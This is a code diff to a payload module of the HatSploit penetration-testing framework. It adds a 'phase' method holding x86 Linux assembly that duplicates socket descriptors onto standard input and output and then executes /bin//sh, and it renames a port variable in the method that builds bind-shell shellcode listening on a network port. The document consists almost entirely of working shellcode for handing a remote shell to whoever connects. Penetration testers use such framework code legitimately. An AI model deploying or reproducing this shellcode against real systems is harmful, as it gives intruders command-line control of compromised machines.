@@ -26,8 +26,35 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Actions': ['phaseless']
         }
 
+    def phase(self):
+        return self.assemble(
+            self.details['Architecture'],
+            """
+                push edi
+                pop ebx
+                push 0x2
+                pop ecx
+
+            dup:
+                dec ecx
+                push 0x3f
+                pop eax
+                int 0x80
+
+                jns dup
+                push 0x68732f2f
+                push 0x6e69622f
+                mov ebx, esp
+                push eax
+                push ebx
+                mov ecx, esp
+                mov al, 0xb
+                int 0x80
+            """
+        )
+
     def run(self):
-        bport = self.pack_port(self.handler['BPORT'])
+        port = self.pack_port(self.handler['BPORT'])
 
         return self.assemble(
             self.details['Architecture'],
@@ -46,7 +73,7 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 pop ebx
                 pop esi
                 push edx
-                push 0x{bport.hex()}0002
+                push 0x{port.hex()}0002
                 push 0x10
                 push ecx
                 push eax
